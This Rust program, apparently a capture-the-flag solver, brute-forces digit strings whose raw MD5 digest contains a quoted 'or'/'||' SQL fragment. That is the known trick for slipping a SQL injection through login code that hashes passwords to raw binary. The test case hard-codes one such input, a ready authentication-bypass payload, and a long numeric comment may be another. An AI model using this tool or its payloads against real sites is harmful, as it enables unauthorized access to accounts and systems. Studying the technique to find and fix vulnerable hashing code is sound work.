#![warn(clippy::all)]
#![warn(clippy::pedantic)]
#![warn(clippy::nursery)]

use once_cell::sync::Lazy;
use openssl::{md::Md, md_ctx::MdCtx};
use rand::{distributions, thread_rng, Rng};
use regex::bytes::Regex;

type Digest = [u8; 32];

/// Regex to detect an escape, followed by an OR pattern, followed by another opening single quote then a digit
/// This is significantly faster than the previous string search method.
// TODO: Find how stop this from being SYNC, as taking the lock wastes a lot of time.
static INJECTION_REGEX: Lazy<Regex> = Lazy::new(|| Regex::new(r"'(\|\||or)'\d").unwrap());

#[inline]
fn byte_validate(digest: &Digest) -> bool {
    INJECTION_REGEX.is_match(digest)
}

// 87153179503375488964249572016766023268706569805029887102402011499288342510775092757977654940386142689199562616975803271832089582121260280598138107679172885818920928633840231384484533108096150415512236913966

fn main() {
    crack();
}

fn crack() {
    // Create all in memory objects here to reduce re-allocation.
    let mut i = 0;
    let mut buf = String::with_capacity(400);
    let mut digest: Digest = [0; 32];
    // Ascii codes for digits.
    let uniform_ascii_digits = distributions::Uniform::from(48..=57);
    let mut ctx = MdCtx::new().unwrap();
    // Distribution for selecting random
    loop {
        if i % 1_000_000 == 0 {
            println!("i = {i}");
        }

        #[cfg(feature = "perf")]
        if i > 10_000_000 {
            return;
        }

        if i & 100 == 0 {
            buf.clear();
        }

        i += 1;

        // Push new string to buf
        unsafe {
            buf.push(char::from_u32_unchecked(
                thread_rng().sample(uniform_ascii_digits),
            ));
        }

        // Calculate md5 hash
        // let str_digest = openssl_str_digest(&buf, &mut digest);
        openssl_digest(&mut ctx, &buf, &mut digest);

        // Check if we can create the OR statement from it.
        if byte_validate(&digest) {
            println!("Found! i = {i}");
            println!("Content = {buf}");
            let str_digest = String::from_utf8_lossy(&digest);
            println!("Raw md5 Hash = {str_digest}");
            return;
        }
    }
}

#[inline]
fn openssl_digest(ctx: &mut MdCtx, buf: &str, digest: &mut [u8; 32]) {
    ctx.digest_init(Md::md5()).unwrap();
    ctx.digest_update(buf.as_bytes()).unwrap();
    ctx.digest_final(digest).unwrap();
}

#[test]
fn test_validation() {
    let buf = "129581926211651571912466741651878684928";

    let mut digest = [0; 32];
    let mut ctx = MdCtx::new().unwrap();

    openssl_digest(&mut ctx, buf, &mut digest);

    let str_digest = String::from_utf8_lossy(&digest);
    println!("{str_digest}");
    assert!(byte_validate(&digest));
}
